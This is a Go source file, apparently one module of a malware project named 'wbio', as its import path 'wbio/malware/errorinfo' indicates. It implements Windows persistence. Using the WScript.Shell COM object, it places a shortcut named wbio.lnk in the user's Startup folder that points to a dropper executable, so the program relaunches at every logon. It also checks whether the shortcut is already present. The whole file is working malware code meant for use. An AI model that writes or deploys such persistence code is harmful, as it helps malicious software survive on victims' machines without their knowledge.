//go:build windows
// +build windows

package persistence

import (
	"errors"
	"fmt"
	"log"
	"os"
	"path/filepath"
	e "wbio/malware/errorinfo"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

func AddPersistence(dropperPath string) {
	dropperPath = filepath.FromSlash(dropperPath + "/" + getExecutableName())
	lnkPath := filepath.FromSlash(fmt.Sprintf("%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/wbio.lnk", os.Getenv("USERPROFILE")))

	if checkIfPersistent(lnkPath) {
		log.Println("[Persistence] Persistence already enabled")
		return
	}
	log.Println("[Persistence] Enabling persistence")
	err := makeLink(dropperPath, lnkPath)
	e.Check(err, true)
	log.Println("[Persistence] Persistence enabled")
}

func makeLink(src, dst string) error {
	ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY)
	oleShellObject, err := oleutil.CreateObject("WScript.Shell")
	if err != nil {
		return err
	}
	defer oleShellObject.Release()
	wshell, err := oleShellObject.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		return err
	}
	defer wshell.Release()
	cs, err := oleutil.CallMethod(wshell, "CreateShortcut", dst)
	if err != nil {
		return err
	}
	idispatch := cs.ToIDispatch()
	oleutil.PutProperty(idispatch, "TargetPath", src)
	oleutil.CallMethod(idispatch, "Save")
	return nil
}

func checkIfPersistent(path string) bool {
	if _, err := os.Stat(path); err == nil {
		return true
	} else if errors.Is(err, os.ErrNotExist) {
		return false
	} else {
		e.Check(err, true)
		return false
	}
}

func getExecutableName() string {
	exec, err := os.Executable()
	e.Check(err, true)
	return filepath.Base(exec)
}
